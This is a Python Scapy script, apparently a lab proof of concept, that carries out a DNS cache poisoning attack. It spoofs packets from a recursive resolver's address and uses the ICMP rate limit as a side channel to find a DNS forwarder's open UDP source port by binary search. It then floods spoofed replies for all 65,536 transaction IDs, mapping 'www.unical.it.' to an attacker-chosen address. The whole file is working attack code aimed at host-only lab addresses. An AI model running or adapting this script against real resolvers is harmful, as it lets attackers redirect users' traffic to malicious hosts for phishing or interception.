#! /usr/bin/env python
from scapy.all import *
from time import perf_counter, sleep

from tqdm import tqdm

# The usual approach for using ScaPy to generate network traffic is not fast enough in order to perform the attack.
# In order to speed up the sending the packets, a layer 2 socket is created for reuse while only being opened once
L2_SOCKET = conf.L2socket(iface='vboxnet0')

# Set the coordinates of the attack
DNS_SERVER_IP = '192.168.56.10' # IPv4 address of the forward DNS resolver
RESOLVER_IP = '192.168.56.20' # IPv4 address of the recursive DNS resolver used by the forward DNS resolver
MIN_PORT = 1024 # Start of the port range to scan
MAX_PORT = 65535 # End of the port range to scan
FQDN_TO_RESOLVE = 'www.unical.it.' # Victim's FQDN
IP_ADDRESS_TO_RESOLVE_FQDN_TO = '192.168.56.100' # IPv4 address to resolve the victim's FQDN to

# Constants holding various Linux kernel values
PORT_SCAN_FREQUENCY = 0.05
PROBE_WAITING_TIME = 0.01
BATCH_SIZE = 50

# The usual approach for using ScaPy to generate network traffic is not fast enough in order to perform the attack.
# The main reason is that the ScaPy objects are translated to bytes when being passed to a send method which takes a considerable amount of time
# In order to circumvent these issues, the ScaPy objects are translated to bytes at the start of the application
# When performing the scan, only the precomputed bytes need to be translated, significantly speeding up the program
UDP_PORT_SCAN_DATAGRAMS = [Ether() / IP(src=RESOLVER_IP, dst=DNS_SERVER_IP) / UDP(sport=53, dport=0) for index in range(0, BATCH_SIZE)]
# Translate the UDP port scanning datagrams to bytes
RAW_UDP_PORT_SCAN_DATAGRAMS = [bytearray(raw(datagram)) for datagram in UDP_PORT_SCAN_DATAGRAMS]
# The UDP source port is modified by changing the bytes just before passing them to the send method ("monkey patching")
# In order to recalculate the UDP checksum of the patched datagram, we need to create a pseudo header object
PSEUDO_HEADER_PORT_SCAN_DATAGRAM = struct.pack(
	"!4s4sHH",
	inet_pton(socket.AF_INET, UDP_PORT_SCAN_DATAGRAMS[0]["IP"].src),
	inet_pton(socket.AF_INET, UDP_PORT_SCAN_DATAGRAMS[0]["IP"].dst),
	socket.IPPROTO_UDP,
	len(RAW_UDP_PORT_SCAN_DATAGRAMS[0][34:]),
)

# Probing packet used by the attacker to determine if there is an open port in the scanned range
VERIFICATION_DATAGRAM = Ether() / IP(dst=DNS_SERVER_IP) / UDP(dport=0) / 'Probing for answer'
VERIFICATION_DATAGRAM_RAW = raw(VERIFICATION_DATAGRAM)

# Return value used to signal that there is no open port in the scanned range
NO_OPEN_PORT = -1

def patch_udp_destination_port(raw_spoofed_dns_reply, detected_source_port, pseudo_header):
	'''Change the UDP destination port of the bytes to be sent over the network.

	This method changes the UDP destination port of a UDP datagram which has been serialised to bytes.
	Once the port has been changed, the UDP checksum is recomputed.
	'''

	# Set the UDP source port
	raw_spoofed_dns_reply[36] = (detected_source_port >> 8) & 0xFF
	raw_spoofed_dns_reply[37] = detected_source_port & 0xFF

	# Reset the checksum
	raw_spoofed_dns_reply[40] = 0x00
	raw_spoofed_dns_reply[41] = 0x00

	# Compute the new checksum
	new_checksum = checksum(pseudo_header + raw_spoofed_dns_reply[34:])
	if new_checksum == 0:
		new_checksum = 0xFFFF
	new_checksum = struct.pack('!H', new_checksum)
	raw_spoofed_dns_reply[40] = new_checksum[0]
	raw_spoofed_dns_reply[41] = new_checksum[1]
	return raw_spoofed_dns_reply

def scan_for_open_ports(candidate_port_range_start, range_size):
	'''Scan for open UDP ports in the specified range.'''

	# Create a list of ports to scan
	destination_ports = [port for port in range(candidate_port_range_start, candidate_port_range_start + range_size)] * int(BATCH_SIZE / range_size)
	# Add padding ports to the range of scanned ports to make sure the batch size required for the attack to work is achieved
	padding_port_scans = BATCH_SIZE - len(destination_ports)
	destination_ports += [1 for port in range(candidate_port_range_start, candidate_port_range_start + padding_port_scans)]

	# Record the time before sending the first datagram in order to determine the sleep time
	start_time = perf_counter()
	# Send the spoofed UDP probe datagrams
	for destination_port, raw_datagram in zip(destination_ports, RAW_UDP_PORT_SCAN_DATAGRAMS):
		# Before sending the datagrams, the UDP source port is changed by modifying the bytes and recalculating the UDP checksum
		L2_SOCKET.send(patch_udp_destination_port(raw_datagram, destination_port, PSEUDO_HEADER_PORT_SCAN_DATAGRAM))
	# Send the probe UDP datagram from the attacker's IP address to the DNS forward resolver
	# In addition, the number of answered and unanswered packets is determined
	answered, unanswered = L2_SOCKET.sr(VERIFICATION_DATAGRAM_RAW, timeout=PROBE_WAITING_TIME, verbose=0)
	# Record the time after sending the spoofed UDP probe datagrams, the UDP probe datagram from the attacker, and waiting for the answers
	stop_time = perf_counter()

	# Calculate the time needed to sleep until the tokens have been recovered
	sleep_duration = PORT_SCAN_FREQUENCY - (stop_time - start_time)
	# Perform the sleep operation
	if sleep_duration > 0:
		sleep(sleep_duration)

	# Determine if there is an open port in the range
	if len(answered) > 0:
		return True
	elif len(unanswered) > 0:
		return False
	else:
		raise 'No answered and unanswered datagrams';

def search_open_port(candidate_port_range_start, range_size):
	'''Perform binary search to narrow down a range of open ports to one open port.'''

	found = False
	# The range size is halfed with every iteration of this method
	range_size = int(range_size / 2)

	# Check if there is at least one open port in the range of scanned ports
	found = scan_for_open_ports(candidate_port_range_start, range_size)
	if found and range_size == 1:
		# The range size is one and there is one open port in the left range --> the open port has been found
		return candidate_port_range_start
	elif found:
		# There is at least one open port in the range --> continue the search in the left half of the range
		return search_open_port(candidate_port_range_start, range_size)
	elif not found:
		# There is no open port in the range --> check the right half of the range for open ports
		found = scan_for_open_ports(candidate_port_range_start + range_size, range_size)
		if found and range_size == 1:
			# There is at one open port and the size of the right range is one --> the open port has been found
			return candidate_port_range_start + range_size
		elif found:
			# There is at least one open port in the right range --> continue searching in the right range
			return search_open_port(candidate_port_range_start + range_size, range_size)
	# There is neither an open port in the left range and in the right range
	return NO_OPEN_PORT

def scan_port_range(port_range_start, port_range_end):
	'''Determine the open port within a range of ports.'''

	# Break the range of ports to scan into batches equal to the ICMP global error rate limit batch size
	for scanned_port_range_start in tqdm(range(port_range_start, port_range_end + 1, BATCH_SIZE)):
		# Check if there is at least one open port in the current batch
		open_port_in_range = scan_for_open_ports(scanned_port_range_start, BATCH_SIZE)

		if open_port_in_range:
			# There is at least one open port in the range --> use binary search to narrow the range down to exactly one open port
			open_port = search_open_port(scanned_port_range_start, BATCH_SIZE)
			if open_port != NO_OPEN_PORT:
				return open_port

	return NO_OPEN_PORT

def prepare_spoofed_dns_replies():
	'''Create spoofed DNS answers used for guessing the transaction ID and poisoning the DNS cache of the DNS resolver.'''

	spoofed_dns_replies = []
	# Create the ScaPy objects representing the spoofed answers
	# Keep in mind that the destination port is not set, because it is not known at this part of the program
	# The destination port is later set by directly modifying the bytes
	for transaction_id in tqdm(range(0, 65536)):
		spoofed_dns_replies.append(
			Ether()
			/ IP(src=RESOLVER_IP, dst=DNS_SERVER_IP)
			/ UDP(sport=53, dport=0)
			/ DNS(
				id=transaction_id, qr=1, qdcount=1, ancount=1,
				qd=DNSQR(qname=FQDN_TO_RESOLVE, qtype=0x0001, qclass=0x0001),
				an=DNSRR(rrname=FQDN_TO_RESOLVE, ttl=300, rdata=IP_ADDRESS_TO_RESOLVE_FQDN_TO)
			)
		)
	# Translate the ScaPy objects to bytes which are sent over the network
	raw_spoofed_dns_replies = [bytearray(raw(spoofed_dns_reply)) for spoofed_dns_reply in tqdm(spoofed_dns_replies)]

	# Create a pseudo header required for recalculating the UDP checksum
	pseudo_header = struct.pack(
		"!4s4sHH",
		inet_pton(socket.AF_INET, spoofed_dns_replies[0]["IP"].src),
		inet_pton(socket.AF_INET, spoofed_dns_replies[0]["IP"].dst),
		socket.IPPROTO_UDP,
		len(raw_spoofed_dns_replies[0][34:]),
	)
	return (raw_spoofed_dns_replies, pseudo_header)

def transmit_spoofed_dns_replies(raw_spoofed_dns_replies, detected_source_port, pseudo_header):
	'''Send the spoofed DNS answers to the determined open UDP port of the forward resolver in order to poison the DNS cache.'''

	for raw_spoofed_dns_reply in raw_spoofed_dns_replies:
		L2_SOCKET.send(patch_udp_destination_port(raw_spoofed_dns_reply, detected_source_port, pseudo_header))

if __name__ == '__main__':
	# Create the spoofed DNS answers in order to achieve the required sending speed required for the attack
	print('Preparing spoofed DNS replies')
	raw_spoofed_dns_replies, pseudo_header = prepare_spoofed_dns_replies()
	# Wait for the user to start the port scan
	print('Press enter to start the port scan')
	input('')
	# Determine the open UDP source port on the forward resolver
	open_port = scan_port_range(MIN_PORT, MAX_PORT + 1)
	if open_port != NO_OPEN_PORT:
		print(f'Found open port {open_port}')
		# The open UDP source port has been found --> poison the DNS cache by spoofing the replies
		transmit_spoofed_dns_replies(raw_spoofed_dns_replies, open_port, pseudo_header)
	else:
		print('No open port found')
